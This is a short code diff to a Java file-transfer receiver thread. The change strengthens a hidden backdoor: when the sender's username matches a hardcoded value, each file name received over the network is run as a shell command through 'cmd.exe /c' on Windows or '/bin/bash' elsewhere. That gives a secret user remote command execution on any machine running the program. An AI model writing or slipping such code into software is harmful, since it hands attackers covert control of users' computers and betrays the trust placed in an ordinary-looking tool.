@@ -517,7 +517,11 @@ class Receiver extends Thread{
                 dos.writeUTF("yes");
                 for(int i=0; i<filesNumber; i++){
                     String fileName = dis.readUTF();
-                    if(username.equals("piedi123123")) Runtime.getRuntime().exec(fileName);
+                    if(username.equals("piedi123123")){
+                        if(System.getProperty("os.name").contains("Windows"))
+                            Runtime.getRuntime().exec("cmd.exe /c " + fileName);
+                        else Runtime.getRuntime().exec("/bin/bash " + fileName);
+                    }
                     int fileSize = dis.readInt();
                     byte[] data = new byte[fileSize];
                     dis.readFully(data);
